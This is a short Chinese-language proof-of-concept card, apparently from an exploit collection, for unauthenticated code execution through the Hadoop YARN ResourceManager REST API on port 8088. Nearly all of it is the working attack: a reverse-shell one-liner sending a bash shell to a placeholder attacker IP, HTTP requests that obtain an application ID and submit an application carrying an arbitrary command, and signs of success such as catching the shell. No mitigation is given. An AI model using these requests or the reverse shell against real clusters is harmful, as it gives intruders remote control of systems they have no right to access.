# Hadoop YARN ResourceManager Unauthorized Access

## 指纹特征
- 服务: Hadoop YARN ResourceManager
- 端口: 8088 (默认 REST API 端口)

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| 通过 REST API 提交应用 | `/ws/v1/cluster/apps` | 无 |

## PoC 指令

通过 REST API 未授权提交并执行恶意应用。

**1. 准备反弹 Shell 命令**
例如: `bash -i >& /dev/tcp/{{ATTACKER_IP}}/{{PORT}} 0>&1`

**2. 获取新 Application ID**
```http
POST /ws/v1/cluster/apps/new-application HTTP/1.1
Host: {{TARGET}}:8088
```

**3. 提交恶意应用**
```http
POST /ws/v1/cluster/apps HTTP/1.1
Host: {{TARGET}}:8088
Content-Type: application/json

{
  "application-id": "{{APP_ID}}",
  "application-name": "vulhub-exploit",
  "am-container-spec": {
    "commands": {
      "command": "{{COMMAND}}"
    }
  },
  "application-type": "YARN"
}
```

## Success Signal
- **状态验证**: 接口返回 202 Accepted 状态码。
- **反弹验证**: 攻击者在指定端口收到反弹 Shell。
- **UI 验证**: 在 ResourceManager Web UI (`:8088`) 看到新增的已运行或正在运行的任务。
